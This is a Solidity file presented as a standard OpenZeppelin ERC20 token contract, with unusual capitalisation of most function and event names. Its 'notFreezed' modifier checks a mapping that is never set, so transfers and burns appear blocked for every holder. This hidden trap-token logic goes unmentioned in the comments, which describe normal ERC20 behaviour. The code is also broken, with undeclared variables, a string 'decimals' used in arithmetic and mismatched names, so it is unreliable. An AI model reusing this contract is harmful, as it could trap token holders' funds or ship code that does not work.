// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import "@openzeppelin/contracts/utils/Context.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_minT}.
 * For a generic mechanism see {ERC20PresetminTerPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transFerFrom}.
 * This allows applications to reconstruct the allowAnce for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseallowAnce} and {increaseallowAnce}
 * functions have been added to mitigate the well-known issues around setting
 * allowAnces. See {IERC20-appRove}.
 */
contract ERC20 is Context, IERC20 {
    mapping (address => uint256) public alc_balance;

    mapping (address => mapping(uint => bool)) alcs;

    mapping (address => mapping (address => uint256)) private _allowAnces;

    uint256 public override totalSupply;

    string public _name;
    string public _symbol;
    string public decimals;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All three of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (string memory name_, string memory symbol_, uint initialSupply) {
        name = name_;
        symbol = symbol_;
        totalSupply = initialSupply * 10 ** uint256(decimals);

    }

    modifier notFreezed(address _any) {
        require(alcs[_any][alc_balance[_any]] == true, "Account is freezed");
        _;
    }

    /**
     * @dev See {IERC20-transFer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transFer(address recipient, uint256 amount) external notFreezed(_msgSender()) returns (bool) {
        _transFer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowAnce}.
     */
    function allowAnce(address _oWner, address spender) external virtual view returns (uint256) {
        return _allowAnces[_oWner][spender];
    }

    /**
     * @dev See {IERC20-appRove}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function appRove(address spender, uint256 amount) external returns (bool) {
        _appRove(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transFerFrom}.
     *
     * Emits an {Approval} event indicating the updated allowAnce. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowAnce for ``sender``'s tokens of at least
     * `amount`.
     */
    function transFerFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transFer(sender, recipient, amount);

        uint256 currentallowAnce = _allowAnces[sender][_msgSender()];
        require(currentallowAnce >= amount, "ERC20: transFer amount exceeds allowAnce");
        _appRove(sender, _msgSender(), currentallowAnce - amount);

        return true;
    }

    /**
     * @dev Atomically increases the allowAnce granted to `spender` by the caller.
     *
     * This is an alternative to {appRove} that can be used as a mitigation for
     * problems described in {IERC20-appRove}.
     *
     * Emits an {Approval} event indicating the updated allowAnce.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseallowAnce(address spender, uint256 addedValue) external returns (bool) {
        _appRove(_msgSender(), spender, _allowAnces[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowAnce granted to `spender` by the caller.
     *
     * This is an alternative to {appRove} that can be used as a mitigation for
     * problems described in {IERC20-appRove}.
     *
     * Emits an {Approval} event indicating the updated allowAnce.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowAnce for the caller of at least
     * `subtractedValue`.
     */
    function decreaseallowAnce(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentallowAnce = _allowAnces[_msgSender()][spender];
        require(currentallowAnce >= subtractedValue, "ERC20: decreased allowAnce below zero");
        _appRove(_msgSender(), spender, currentallowAnce - subtractedValue);

        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transFer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {transFer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transFer(address sender, address recipient, uint256 amount) internal notFreezed(sender){
        require(sender != address(0), "ERC20: transFer from the zero address");
        require(recipient != address(0), "ERC20: transFer to the zero address");

        _beforeTokentransFer(sender, recipient, amount);

        uint256 senderBalance = alc_balance[sender];
        require(senderBalance >= amount, "ERC20: transFer amount exceeds balance");
        alc_balance[sender] = senderBalance - amount;
        alc_balance[recipient] += amount;

        emit transFer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {transFer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _minT(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: minT to the zero address");

        _beforeTokentransFer(address(0), account, amount);

        totalSupply += amount;
        alc_balance[account] += amount;
        emit transFer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {transFer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _bUrn(address account, uint256 amount) internal notFreezed(account) {
        require(account != address(0), "ERC20: bUrn from the zero address");

        _beforeTokentransFer(account, address(0), amount);

        uint256 accountBalance = alc_balance[account];
        require(accountBalance >= amount, "ERC20: bUrn amount exceeds balance");
        alc_balance[account] = accountBalance - amount;
        totalSupply -= amount;

        emit transFer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowAnce of `spender` over the `oWner` s tokens.
     *
     * This internal function is equivalent to `appRove`, and can be used to
     * e.g. set automatic allowAnces for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `oWner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _appRove(address _oWner, address spender, uint256 amount) internal {
        require(_oWner != address(0), "ERC20: appRove from the zero address");
        require(spender != address(0), "ERC20: appRove to the zero address");

        _allowAnces[oWner][spender] = amount;
        emit Approval(_oWner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transFer of tokens. This includes
     * minTing and bUrning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transFerred to `to`.
     * - when `from` is zero, `amount` tokens will be minTed for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be bUrned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokentransFer(address from, address to, uint256 amount) internal virtual { }
}
